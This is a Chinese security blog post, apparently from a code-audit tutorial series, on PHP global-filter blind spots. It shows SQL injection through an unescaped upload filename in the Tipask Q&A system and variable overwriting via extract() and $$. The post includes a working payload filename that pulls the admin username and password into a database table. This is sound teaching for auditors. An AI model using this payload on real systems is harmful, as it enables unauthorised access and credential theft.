@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="关注网络安全">
+  <meta name="keyword" content="web安全 代码审计">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      影风博客
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    <script src="/js/qrious.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png">
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>影风博客</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">主页</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">所有文章</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">标签</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">关于</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">主页</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">所有文章</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">标签</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">关于</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2></h2>
+  <p class="post-date">2019-07-27</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>接下来是全局防护存在的盲点下篇，盲点如下：</p>
+<p>1)<code>FILES</code>注入，全局只转义掉<code>GET</code>、<code>POST</code>等传来的参数，遗漏了<code>FILES</code>；</p>
+<p>2)变量覆盖，危险函数：<code>extract()</code>、<code>parse_str()</code>、<code>$$</code>。</p>
+<h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>知识储备：<code>php</code>基础、<code>MySql</code>入门</p>
+<p>工具：<code>notepad++</code></p>
+<p>服务器环境：<code>wamp</code></p>
+<p>测试代码: 见文中</p>
+<h2 id="0x02-全局防护盲点总结下篇的脑图"><a href="#0x02-全局防护盲点总结下篇的脑图" class="headerlink" title="0x02 全局防护盲点总结下篇的脑图"></a>0x02 全局防护盲点总结下篇的脑图</h2><p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160624-1466736791494073424.jpg" alt></p>
+<h2 id="0x03-FILES注入"><a href="#0x03-FILES注入" class="headerlink" title="0x03 FILES注入"></a>0x03 FILES注入</h2><p><code>FILES</code>注入一般情况是是因为上传时把上传的名字带到<code>insert</code>入库产生的，这里看下<code>tipask</code>问答系统，首先看看它的全局防护是怎么处理的：</p>
+<p><code>index.php</code>里：</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> TIPASK_ROOT . <span class="string">'/model/tipask.class.php'</span>;</span><br><span class="line">$tipask = <span class="keyword">new</span> tipask();</span><br><span class="line">$tipask-&gt;run();</span><br></pre></td></tr></table></figure>
+
+<p>跟进到<code>/model/tipask.class.php</code>:</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_request</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">$this</span>-&gt;get = taddslashes(<span class="keyword">$this</span>-&gt;get, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;post = taddslashes(array_merge($_GET, $_POST));</span><br><span class="line">    checkattack(<span class="keyword">$this</span>-&gt;post, <span class="string">'post'</span>);</span><br><span class="line">    checkattack(<span class="keyword">$this</span>-&gt;get, <span class="string">'get'</span>);</span><br><span class="line">    <span class="keyword">unset</span>($_POST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到对<code>get</code>和<code>post</code>传来的数据进行了<code>addslashes</code>特殊转义处理，对<code>$_FILES</code>没有任何处理操作，我们全局搜索<code>$_FILES</code>，发现<code>/control/attach.php</code>有上传处理，我们跟进：</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onupload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//上传配置</span></span><br><span class="line">    $config = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"uploadPath"</span> =&gt; <span class="string">"data/attach/"</span>, <span class="comment">//保存路径</span></span><br><span class="line">        <span class="string">"fileType"</span> =&gt; <span class="keyword">array</span>(<span class="string">".rar"</span>, <span class="string">".doc"</span>, <span class="string">".docx"</span>, <span class="string">".zip"</span>, <span class="string">".pdf"</span>, <span class="string">".txt"</span>, <span class="string">".swf"</span>, <span class="string">".wmv"</span>, <span class="string">"xsl"</span>), <span class="comment">//文件允许格式</span></span><br><span class="line">        <span class="string">"fileSize"</span> =&gt; <span class="number">10</span> <span class="comment">//文件大小限制，单位MB</span></span><br><span class="line">    );</span><br><span class="line"><span class="comment">//文件上传状态,当成功时返回SUCCESS，其余值将直接返回对应字符窜</span></span><br><span class="line">    $state = <span class="string">"SUCCESS"</span>;</span><br><span class="line">    $clientFile = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($clientFile)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;'state':'文件大小超出服务器配置！','url':'null','fileType':'null'&#125;"</span>; <span class="comment">//请修改php.ini中的upload_max_filesize和post_max_size</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//格式验证</span></span><br><span class="line">    $current_type = strtolower(strrchr($clientFile[<span class="string">"name"</span>], <span class="string">'.'</span>));</span><br><span class="line">    <span class="keyword">if</span> (!in_array($current_type, $config[<span class="string">'fileType'</span>])) &#123;</span><br><span class="line">        $state = <span class="string">"不支持的文件类型！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//大小验证</span></span><br><span class="line">    $file_size = <span class="number">1024</span> * <span class="number">1024</span> * $config[<span class="string">'fileSize'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($clientFile[<span class="string">"size"</span>] &gt; $file_size) &#123;</span><br><span class="line">        $state = <span class="string">"文件大小超出限制！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//保存文件</span></span><br><span class="line">    <span class="keyword">if</span> ($state == <span class="string">"SUCCESS"</span>) &#123;</span><br><span class="line">        $targetfile = $config[<span class="string">'uploadPath'</span>] . gmdate(<span class="string">'ym'</span>, <span class="keyword">$this</span>-&gt;time) . <span class="string">'/'</span> . random(<span class="number">8</span>) . strrchr($clientFile[<span class="string">"name"</span>], <span class="string">'.'</span>);</span><br><span class="line">        $result = $_ENV[<span class="string">'attach'</span>]-&gt;movetmpfile($clientFile, $targetfile);</span><br><span class="line">        <span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">            $state = <span class="string">"文件保存失败！"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $_ENV[<span class="string">'attach'</span>]-&gt;add($clientFile[<span class="string">"name"</span>], $current_type, $clientFile[<span class="string">"size"</span>], $targetfile, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//向浏览器返回数据json数据</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&#123;"state":"'</span> . $state . <span class="string">'","url":"'</span> . $targetfile . <span class="string">'","fileType":"'</span> . $current_type . <span class="string">'","original":"'</span> . $clientFile[<span class="string">"name"</span>] . <span class="string">'"&#125;'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这句<code>$_ENV[&#39;attach&#39;]-&gt;add($clientFile[&quot;name&quot;]…)</code>，将<code>$clientFile[name] = $_FILES[&quot;upfile&quot;][name]</code>带入了如下<code>add</code>入库的操作，从而造成注入。</p>
+<p>跟进对应的<code>add</code>方法：</p>
+<p><code>attach.class.php</code>：</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($filename,$ftype,$fsize,$location,$isimage=<span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">    $uid=<span class="keyword">$this</span>-&gt;base-&gt;user[<span class="string">'uid'</span>];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"INSERT INTO "</span>.DB_TABLEPRE.<span class="string">"attach(time,filename,filetype,filesize,location,isimage,uid)  VALUES (&#123;$this-&gt;base-&gt;time&#125;,'$filename','$ftype','$fsize','$location',$isimage,$uid)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;insert_id();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传一个文件，然后修改文件名称为以下代码即可获取管理员账户密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;1&apos;,&apos;.php&apos;,1,(select concat(username,0x23,password) from ask_user limit 1),2,1)#.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g194o5xvj8j311h09cjsi.jpg" alt></p>
+<p>执行的语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> ask_attach(<span class="built_in">time</span>,filename,filetype,filesize,location,isimage,uid)  <span class="keyword">VALUES</span> (<span class="number">1553056615</span>,<span class="string">'1'</span>,<span class="string">'.php'</span>,<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> ask_user <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)<span class="comment">#.jpg','.jpg','10508','data/attach/1903/XNhgshMb.jpg',1,1)</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库里成功将管理员账户密码插入到<code>attach</code>表中：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`ask_attach`</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">30</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160624-1466737993429000665.jpg" alt></p>
+<h2 id="0x04-变量覆盖"><a href="#0x04-变量覆盖" class="headerlink" title="0x04 变量覆盖"></a>0x04 变量覆盖</h2><p>出现比较多的是<code>extract</code>函数，例如<code>extract($_POST)</code>会直接从<code>POST</code>数组中取出变量，覆盖掉之前的一些变量。</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">222333</span>;</span><br><span class="line">@extract($_POST);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器里<code>post</code>直接传<code>a=1</code>发现成功覆盖了变量<code>a</code>的值</p>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160624-1466738106715017290.jpg" alt></p>
+<p>之前出现过案例是覆盖表前缀上，例如<code>sql</code>执行语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title,<span class="keyword">content</span> <span class="keyword">from</span> &#123;$pre&#125;news <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>然后攻击者直接浏览器提交<code>pre=获取敏感信息的语句</code>来覆盖表前缀从而实现注入攻击。</p>
+<p><code>$$</code>变量覆盖</p>
+<p>原理其实跟上面一样，有个很经典的<code>$$</code>变量覆盖的代码：</p>
+<figure class="highlight php"><figcaption><span>&#123;.line-numbers&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">22333</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">        $$_key=addslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试发现成功覆盖了变量<code>a</code>:</p>
+<p><img src="http://7xo6kd.com1.z0.glb.clouddn.com/upload-ueditor-image-20160624-1466738295275023386.jpg" alt></p>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/07/27/代码审计的艺术系列 - 第九篇 文件包含漏洞/">
+        <span class="nav-arrow">← </span>
+        
+          (untitled)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/07/27/代码审计的艺术系列 - 第七篇/">
+        
+          (untitled)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x00-前言"><span class="toc-nav-text">0x00 前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-准备"><span class="toc-nav-text">0x01 准备</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-全局防护盲点总结下篇的脑图"><span class="toc-nav-text">0x02 全局防护盲点总结下篇的脑图</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-FILES注入"><span class="toc-nav-text">0x03 FILES注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x04-变量覆盖"><span class="toc-nav-text">0x04 变量覆盖</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'https://storysec.github.io/2019/07/27/代码审计的艺术系列 - 第六篇/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2019 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+<script src="/js/script.js"></script>
+  </body>
+</html>
